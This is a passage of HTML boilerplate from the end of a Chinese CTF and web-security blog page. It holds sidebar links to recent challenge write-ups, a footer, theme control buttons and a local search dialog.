里看懂 Str2 的字符替换</a><time datetime="2026-11-01T01:20:00.000Z" title="发表于 2026-11-01 09:20:00">2026-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/01/misc-traffic-sniffed/" title="[BUUCTF] 被嗅探的流量：用 HTTP 过滤器从 POST 上传里捞出 flag">[BUUCTF] 被嗅探的流量：用 HTTP 过滤器从 POST 上传里捞出 flag</a><time datetime="2026-11-01T01:00:00.000Z" title="发表于 2026-11-01 09:00:00">2026-11-01</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Quellisya</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div><div class="footer_custom_text">以墨为舟，以码为桨 · CTF & Web Security Notes</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script defer src="/js/butterfly-custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索笔记、题目或 payload…" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.0"></script></div></div></body></html>
